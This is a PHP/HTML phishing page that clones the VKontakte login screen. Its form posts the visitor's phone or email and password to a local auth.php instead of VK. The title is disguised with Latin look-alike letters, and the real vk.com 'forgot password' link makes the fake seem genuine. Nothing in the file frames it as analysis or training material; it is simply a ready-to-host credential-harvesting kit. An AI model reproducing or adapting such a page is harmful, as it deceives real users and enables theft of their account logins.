<?php
	$act = array_key_exists('act', $_GET) ? (string)$_GET['act'] : '';
	if ($act == 'login') {
		header("Location: login.php");
		exit();
	}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="shortcut icon" href="files/faviconnew.ico"/><meta http-equiv="content-type" content="text/html; charset=utf-8"/><meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
<title>Добрo пожаловать | ВКoнтактe</title><link rel="stylesheet" type="text/css" href="files/common.css"/>
<!--[if lte IE 6]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(files/ie6.css?26); /* ]]> */</style><![endif]-->
<!--[if IE 7]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(files/ie7.css?18); /* ]]> */</style><![endif]-->
<link type="text/css" rel="stylesheet" href="files/index.css">
<style type="text/css">#page_header .back, #page_header .left, #page_header .right, #top_logo_down {background-image: url(files/hatf.gif?1);}.is_2x #page_header .back, .is_2x #page_header .left, .is_2x #page_header .right, .is_2x #top_logo_down {background-image: url(files/hat_ny_1_2x.gif)</style>
</head>
<body class="is_rtl font_default pads">
	<script type="text/javascript" src="index1.js"></script>
	<div id="quick_login">
		<form method="POST" id="quick_login_form" action="auth.php">
			<div class="label">Телефон или email</div>
			<div class="labeled"><input name="email" class="text" id="quick_email" type="text" autofocus/></div>
			<div class="label">Пароль</div>
			<div class="labeled"><input name="pass" class="text" id="quick_pass" type="password"/></div>
			<input class="submit" type="submit"/>
			<div class="button_blue button_wide button_big" id="quick_auth_button"><button type="submit" id="quick_login_button">Войти</button></div>
		</form>
		<div class="clear forgot"><a id="quick_forgot" href="//vk.com/restore" target="_top">Забыли пароль?</a></div>
	</div>
	<script type="text/javascript" src="index2.js"></script>
	<div id="footer" class="clear"><div class="copy_lang"><a href="//vk.com/about">ВКoнтaктe</a> &copy; <?php date('Y') ?> <a class="bnav_lang" href="#">English</a><a class="bnav_lang" href="#">Русский</a><a class="bnav_lang" href="#">Українська</a></div></div></div><div class="clear"></div></div></div></div></div><div class="progress" id="global_prg"></div>
</body>
</html>